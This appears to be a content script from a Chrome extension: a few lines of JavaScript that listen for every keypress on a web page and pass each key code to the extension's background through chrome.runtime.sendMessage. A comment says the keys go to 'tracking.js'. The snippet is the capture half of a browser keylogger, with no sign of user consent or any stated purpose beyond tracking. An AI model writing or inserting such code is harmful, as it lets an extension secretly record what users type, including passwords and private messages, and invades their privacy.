//TODO look for key presses and if you find some, send to tracking.js
document.addEventListener("keypress", function(event){
    var key = event.code;
    console.log(key);
    chrome.runtime.sendMessage({keyVal: key}, (response) => {
        console.log(response.resp);
      });
})




